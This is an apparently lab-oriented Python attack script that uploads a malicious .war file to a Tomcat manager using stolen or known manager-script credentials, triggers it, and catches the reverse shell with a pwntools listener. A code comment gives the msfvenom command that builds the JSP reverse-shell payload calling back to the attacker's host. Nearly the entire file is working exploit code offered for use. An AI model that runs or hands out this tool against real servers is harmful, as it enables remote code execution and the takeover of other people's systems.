#/usr/bin/python3

import requests, pwn, sys, argparse, threading, signal
from time import sleep

## USAGE: python3 uploadwar.py [-h] username password url war [-lport LPORT]
## If you don't want to get the shell using the pwntools library, start listening with NCat or something else before launching the script
## and don't use the '-lport' flag.


##COLOUR CODES
gray="\033[1;30;40m"
red="\033[1;31;40m"
green="\033[1;32;40m"
yellow="\033[1;33;40m"
blue="\033[1;34;40m"
magenta="\033[1;35;40m"
cyan="\033[1;36;40m"
white="\033[1;37;40m"
end_colour="\033[0m"


#INT SIGNAL HANDLER
def sig_handler(sig, frame):
	print("\n%s[!] Exiting...\n%s" % (red,end_colour))
	sys.exit(130)


def uploadFile(user, password, url, war_file):

	session = requests.Session()
	session.auth = (user, password)
	update_url="%s/manager/text/deploy?path=/foo&update=true" % url

    # To create the malicious .war file, you must execute the following command:
    # msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=<your_listen_port> -f war > pwn.war
	files={'files': open(war_file, 'rb')}
	l1 = pwn.log.progress("Updating malicious war file")
	l1.status("Updating...")
	sleep(1)
	r = session.put(update_url, files=files)

	l1.success("Updated")
	l2 = pwn.log.progress("Sending GET request to the updated file")
	l2.status("Sending...")
	sleep(1)

	get_url="%s/foo" % url
	f = requests.get(get_url)
	l2.success("Request done! Check your listener")


def listener(lport):

	shell = pwn.listen(lport).wait_for_connection()
	shell.interactive()


#CTRL+C
signal.signal(signal.SIGINT, sig_handler)

if __name__ == '__main__':

    parser = argparse.ArgumentParser(
    	usage="python3 %s [-h] username password url war [-lport LPORT]" % sys.argv[0],
    	description="%sUpload a malicious .war file to the Tomcat service of the victim. The user must have 'manager-script' role%s" % (yellow,end_colour)
    )

    parser.add_argument("username", help="Tomcat user with 'manager-script' role")
    parser.add_argument("password", help="Password of the Tomcat user")
    parser.add_argument("url", help="URL of the victim (including the port). Ex: http://10.10.10.15:8080")
    parser.add_argument("war", help="Path of the malicious .war file")
    parser.add_argument("-lport", help="The port you want to listen on")

    print("%s" % red)

    args = parser.parse_args()

    user = args.username
    password = args.password
    url = args.url
    war_file = args.war

    if (args.lport is not None):
    	if (int(args.lport) > 0 and int(args.lport) < 65536):
        	threading.Thread(target=listener, args=(args.lport,)).start()
        	uploadFile(user, password, url, war_file)
    	else:
    		print("%sThe port isn't correct\n %s" % (red, end_colour))
    		sys.exit(1)
    else:
        uploadFile(user, password, url, war_file)
